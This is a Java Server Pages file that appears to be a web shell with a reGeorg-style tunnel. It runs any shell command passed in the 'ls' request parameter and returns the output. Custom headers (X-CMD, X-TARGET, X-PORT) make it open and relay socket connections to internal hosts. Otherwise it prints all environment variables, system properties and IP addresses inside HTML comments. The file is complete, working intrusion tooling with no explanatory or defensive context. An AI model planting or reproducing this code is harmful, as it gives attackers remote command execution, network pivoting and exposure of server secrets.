<%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
//  trimDirectiveWhitespaces="true"
String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n";

Map<String, String> env = System.getenv();
for (String envName : env.keySet())
{
    szSys += envName + " = " + env.get(envName) + "\n";
}

Properties capitals = System.getProperties();
Set states = capitals.keySet();
for (Object name : states)
{
    szSys += (String)name + " = " + (String)capitals.getProperty((String) name) + "\n";
}

if(-1 < szSys.indexOf(":\\Windows"))
{
    bh = "cmd.exe";
    cS = "/C";
}
else if(null != request.getParameter("bash"))
{
    bh = request.getParameter("bash").toString();
    if(-1 < bh.indexOf("cmd"))cS = "/C";
}
if (cmd != null)
{
    Process p = null;
    byte[] b = new byte[2048];
    OutputStream os = null;
    InputStream in = null;
    int x = 0;
    try{
        p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
        //p.waitFor();
        os = p.getOutputStream();
        in = p.getInputStream();
        x = in.read(b, 0, b.length); 
        while(-1 < x)
        {
          if(0 < x)out.print(new String(b,0,x));
          x = in.read(b, 0, b.length);
        }
        os.close();
        in.close();
        szSys = "";
    } catch (Exception x6) {
        try{
            p = Runtime.getRuntime().exec(cmd);
            //p.waitFor();

            os = p.getOutputStream();
            in = p.getInputStream();
            
            x = in.read(b, 0, b.length); 
            while(-1 < x)
            {
              if(0 < x)out.print(new String(b,0,x));
              x = in.read(b, 0, b.length);
            }
            os.close();
            in.close();
            szSys = "";
        } catch (Exception x1) {
            out.println(x1.getMessage());
        }
    }
}

    cmd = request.getHeader("X-CMD");
    if (cmd != null)
    {
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = request.getHeader("X-TARGET");
                int port = Integer.parseInt(request.getHeader("X-PORT"));
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                session.setAttribute("socket", socketChannel);
                response.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            } catch (IOException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                
            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try{
                socketChannel.socket().close();
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
            }
            session.invalidate();
        } else if (cmd.compareTo("READ") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {            
                ByteBuffer buf = ByteBuffer.allocate(512);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = response.getOutputStream();
                while (bytesRead > 0){
                    so.write(buf.array(),0,bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                response.setHeader("X-STATUS", "OK");
                so.flush();
                so.close();            
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            }        
            
        } else if (cmd.compareTo("FORWARD") == 0)
        {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {
                
                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                ByteBuffer buf = ByteBuffer.allocate(readlen);
                buf.clear();
                buf.put(buff);
                buf.flip();

                while(buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
                response.setHeader("X-STATUS", "OK");
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
        }
    }
    else
    {
        try {
        String szIp = "";
            Set<InetAddress> addrs = new HashSet<InetAddress>();
            Enumeration<NetworkInterface> ns = null;
            try {
                ns = NetworkInterface.getNetworkInterfaces();
            } catch (SocketException e) {
            }
            while (ns != null && ns.hasMoreElements()) 
            {
                NetworkInterface n = ns.nextElement();
                Enumeration<InetAddress> is = n.getInetAddresses();
                while (is.hasMoreElements()) {
                    InetAddress i = is.nextElement();
                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
                }
            }

            out.print("<!-- ip:" + szIp + "," + szSys+ " -->");  
        } catch (Exception e) {
        }
        out.print("<!-- _xx_xx_ -->"); 
    }
%>